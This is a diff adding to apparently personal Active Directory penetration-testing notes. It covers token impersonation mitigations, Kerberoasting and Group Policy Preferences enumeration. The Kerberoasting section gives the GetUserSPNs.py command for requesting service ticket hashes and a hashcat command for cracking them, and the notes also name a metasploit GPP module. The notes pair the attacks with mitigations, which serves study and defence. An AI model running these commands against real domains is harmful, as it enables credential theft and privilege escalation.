@@ -73,3 +73,35 @@ crack with hashcat
 - `rev2self` to revert to self after impersonation
 
 
+#### Token impersonation mitigation
+- Limit user/group token creation permissions
+- account tiering and isolation
+	- regular user account for day to day, admin account for specific needs on specific machines
+		- i.e domain admin should only log in to domain controller and not local machines
+- local admin restriction
+
+
+---
+## Kerberoasting
+---
+
+[kerberoasting info](https://medium.com/mitigation@Shorty420/kerberoasting-9108477279cc)
+
+### attack steps
+- Get SPNs, Dump Hash
+	- `GetUserSPNs.py <domain/username:password> -dc-ip <ip of DC> -request`
+- attempt crach hash with hashcat
+	- `hashcat -m 13100 kerberoasthash.txt rockyou.txt`
+
+#### Kerberoasting Mitigations
+- strong passwords
+- least privilege
+	- don't make service accounts domain admins, and dont' give service accounts weak passwords
+
+---
+## GPP Attacks
+---
+
+### Group Policy Preferences
+- metasploit smb_enum_gpp to check
+
